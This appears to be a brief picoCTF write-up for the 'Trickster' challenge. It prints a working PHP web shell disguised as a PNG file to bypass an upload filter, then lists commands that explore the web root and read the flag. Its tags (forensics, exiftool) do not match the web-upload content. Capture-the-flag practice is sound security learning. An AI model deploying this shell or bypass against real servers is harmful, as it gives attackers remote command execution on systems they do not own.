---

title: "# Trickster"
date: 2026-06-05
draft: false
tags: ["picoctf", "forensics", "metadata", "exiftool"]
------------------------------------------------------

### Description
I found a web app that can help process images: PNG

# solution
- create a file with name  (untitle.png.php)
- edit this file
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- upload this png file and type `http://atlas.picoctf.net:58157/uploads/untitled.png.php`
- RUN
```
ls -al
ls -al /var/www/html
cat /var/www/html/GAZWIMLEGU2DQ.txt
```
